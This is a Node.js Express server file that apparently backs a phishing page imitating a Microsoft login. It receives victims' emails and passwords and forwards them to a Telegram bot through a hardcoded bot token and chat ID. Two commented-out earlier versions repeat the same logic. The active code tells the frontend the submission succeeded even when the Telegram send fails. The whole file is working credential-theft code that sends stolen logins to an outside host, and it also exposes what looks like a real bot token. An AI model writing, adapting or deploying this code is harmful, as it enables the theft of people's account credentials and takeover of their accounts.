const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

// For Node.js v18 and above, we can use built-in fetch
// No need for node-fetch package!

const app = express();
app.use(bodyParser.json());
app.use(express.static(__dirname));

// REPLACE WITH YOUR TELEGRAM DETAILS
const BOT_TOKEN = '8547333019:AAEVmpLZQLHP_S0JcVCDftsRUlklx7HSNR4';  // Put your actual token here
const CHAT_ID = '6220661383';      // Put your actual chat ID here

app.post('/submit', async (req, res) => {
    console.log("=".repeat(50));
    console.log("📥 DATA RECEIVED:");
    console.log(JSON.stringify(req.body, null, 2));
    console.log("=".repeat(50));

    const { type, email, password } = req.body;

    let message = '';
    if (type === 'email') {
        message = `📧 New Microsoft Login Attempt\n\nEmail: ${email}\nTime: ${new Date().toLocaleString()}`;
    } else if (type === 'password') {
        message = `🔐 Password Received\n\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
    }

    try {
        // Using built-in fetch (Node.js v18+)
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        console.log("📤 Sending to Telegram...");

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();

        if (result.ok) {
            console.log('✅ Sent to Telegram successfully!');
            res.json({ success: true, message: "Sent to Telegram" });
        } else {
            console.error('❌ Telegram API Error:', result);
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('❌ Error:', error.message);
        // Still send success to frontend even if Telegram fails
        res.json({ success: true, warning: "Data received but Telegram send failed" });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// const PORT = 3000;
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server running on http://localhost:${PORT}`);
    console.log(`📁 Serving files from: ${__dirname}`);
    console.log(`🤖 Bot Token: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 15) + '...' : 'Not set'}`);
    console.log(`💬 Chat ID: ${CHAT_ID ? CHAT_ID : 'Not set'}`);
    console.log(`\n💡 Waiting for form submissions...`);
});


// const express = require('express');
// const bodyParser = require('body-parser');
// const fetch = require('node-fetch');
// const path = require('path');

// const app = express();
// app.use(bodyParser.json());
// app.use(express.static(__dirname));

// // REPLACE WITH YOUR TELEGRAM DETAILS
// const BOT_TOKEN = '8547333019:AAEVmpLZQLHP_S0JcVCDftsRUlklx7HSNR4';
// const CHAT_ID = '6220661383';

// app.post('/submit', async (req, res) => {
//     console.log("Received request:", req.body);
//     const { type, email, password } = req.body;

//     let message = '';
//     if (type === 'email') {
//         message = `📧 New Microsoft Login Attempt\n\nEmail: ${email}\nTime: ${new Date().toLocaleString()}`;
//     } else if (type === 'password') {
//         message = `🔐 Password Received\n\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
//     }

//     try {
//         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
//         const response = await fetch(telegramUrl, {
//             method: 'POST',
//             headers: { 'Content-Type': 'application/json' },
//             body: JSON.stringify({
//                 chat_id: CHAT_ID,
//                 text: message,
//                 parse_mode: 'HTML'
//             })
//         });

//         const result = await response.json();
//         console.log('Telegram response:', result);

//         if (result.ok) {
//             console.log('✅ Sent to Telegram successfully');
//             res.json({ success: true });
//         } else {
//             console.error('❌ Telegram error:', result);
//             res.json({ success: false, error: result.description });
//         }
//     } catch (error) {
//         console.error('❌ Fetch error:', error);
//         res.json({ success: false, error: error.message });
//     }
// });

// app.get('/', (req, res) => {
//     res.sendFile(path.join(__dirname, 'index.html'));
// });

// const PORT = 3000;
// app.listen(PORT, () => {
//     console.log(`✅ Server running on http://localhost:${PORT}`);
//     console.log(`📁 Serving files from: ${__dirname}`);
//     console.log(`🤖 Bot Token set: ${BOT_TOKEN ? 'Yes' : 'No'}`);
//     console.log(`💬 Chat ID set: ${CHAT_ID ? 'Yes' : 'No'}`);
// });














// const express = require('express');
// const bodyParser = require('body-parser');
// const fetch = require('node-fetch');

// const app = express();
// app.use(bodyParser.json());
// app.use(bodyParser.urlencoded({ extended: true }));
// app.use(express.static('public')); // Serve your HTML/CSS/JS files

// // TELEGRAM CONFIGURATION
// const BOT_TOKEN = '8547333019:AAEVmpLZQLHP_S0JcVCDftsRUlklx7HSNR4'; // Get from @BotFather on Telegram
// const CHAT_ID = '6220661383'; // Your Telegram chat ID

// // Endpoint to receive data from your frontend
// app.post('/submit', async (req, res) => {
//     const { type, email, password } = req.body;

//     let message = '';

//     if (type === 'email') {
//         message = `📧 New Microsoft Login Attempt\n\nEmail: ${email}\nTime: ${new Date().toLocaleString()}`;
//     } else if (type === 'password') {
//         message = `🔐 Password Received\n\nEmail: ${req.body.email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
//     }

//     // Send to Telegram
//     try {
//         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
//         await fetch(telegramUrl, {
//             method: 'POST',
//             headers: { 'Content-Type': 'application/json' },
//             body: JSON.stringify({
//                 chat_id: CHAT_ID,
//                 text: message,
//                 parse_mode: 'HTML'
//             })
//         });

//         res.json({ success: true });
//     } catch (error) {
//         console.error('Telegram error:', error);
//         res.json({ success: false });
//     }
// });

// app.listen(3000, () => {
//     console.log('Server running on http://localhost:3000');
// });